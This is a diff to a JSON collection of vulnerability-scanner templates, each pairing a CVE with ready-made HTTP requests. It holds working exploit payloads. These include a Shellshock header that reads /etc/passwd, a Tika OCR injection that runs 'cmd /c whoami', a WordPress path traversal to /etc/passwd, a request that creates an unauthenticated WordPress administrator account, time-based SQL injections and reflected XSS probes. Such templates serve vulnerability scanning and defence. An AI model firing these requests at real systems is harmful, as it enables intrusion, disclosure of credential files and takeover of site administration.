@@ -3391,9 +3391,9 @@
       "requests": [
         {
           "headers": {
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -6756,11 +6756,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "Content-type": "image/jp2",
+            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
-            "Expect": "100-continue",
-            "Content-type": "image/jp2",
-            "Connection": "close"
+            "Expect": "100-continue"
           },
           "method": "PUT",
           "path": [
@@ -14719,6 +14719,21 @@
       ]
     },
     {
+      "id": "CVE-2021-24227",
+      "info": {
+        "name": "Patreon WordPress < 1.7.0 - Unauthenticated Local File Disclosure",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/?patron_only_image=../../../../../../../../../../etc/passwd&patreon_action=serve_patron_only_image"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-24235",
       "info": {
         "name": "WordPress Goto Tour & Travel Theme <2.0 - Cross-Site Scripting",
@@ -19230,6 +19245,21 @@
       ]
     },
     {
+      "id": "CVE-2022-0441",
+      "info": {
+        "name": "MasterStudy LMS plugin < 2.7.6 - Unauthenticated Admin Account Creation",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET / HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /wp-admin/admin-ajax.php?action=stm_lms_register&nonce={{nonce}} HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nContent-Type: application/json\n\n{\"user_login\":\"{{username}}\",\"user_email\":\"{{user_email}}\",\"user_password\":\"{{password}}\",\"user_password_re\":\"{{password}}\",\"become_instructor\":\"\",\"privacy_policy\":true,\"degree\":\"\",\"expertize\":\"\",\"auditory\":\"\",\"additional\":[],\"additional_instructors\":[],\"profile_default_fields_for_register\":{\"wp_capabilities\":{\"value\":{\"administrator\":1}}}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-0482",
       "info": {
         "name": "Easy!Appointments <1.4.3 - Broken Access Control",
@@ -19774,6 +19804,20 @@
       ]
     },
     {
+      "id": "CVE-2022-1768",
+      "info": {
+        "name": "RSVPMaker WordPress plugin <= 9.3.2 - SQL Injection",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "@timeout: 15s\nPOST /wp-json/rsvpmaker/v1/stripesuccess/anythinghere HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nrsvp_id=(select(0)from(select(sleep(5)))a)&amount=1234&email=randomtext\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-1815",
       "info": {
         "name": "Drawio < 18.1.2 - Server Side Request Forgery",
@@ -20304,6 +20348,20 @@
           "path": [
             "{{BaseURL}}/admin/airflow/code?root=&dag_id=example_passing_params_via_test_command",
             "{{BaseURL}}/code?dag_id=example_passing_params_via_test_command"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-2467",
+      "info": {
+        "name": "SourceCodester Garage Management System 1.0 - SQL Injection",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "@timeout: 10s\nPOST /login.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername=1@a.com' AND (SELECT 6427 FROM (SELECT(SLEEP(5)))LwLu) AND 'hsvT'='hsvT&password=412312&login=test2334\n"
           ]
         }
       ]
@@ -21087,6 +21145,36 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/dms/admin/accounts/payment_history.php?account_id=2%27"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-30513",
+      "info": {
+        "name": "School Dormitory Management - Authenticated XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /dms/admin/login.php?f=login HTTP/1.1\nHost: {{Hostname}}\n\nusername={{username}}&password={{password}}\n",
+            "GET /dms/admin/?page=%27%3B%20alert(document.domain)%3B%20s%3D%27 HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-30514",
+      "info": {
+        "name": "School Dormitory Management -  Authenticated XSS via \"s=\" parameter",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /dms/admin/login.php?f=login HTTP/1.1\nHost: {{Hostname}}\n\nusername={{username}}&password={{password}}\n",
+            "GET /dms/admin/?s=%27%3B%20alert(document.domain)%3B%20s%3D%27 HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
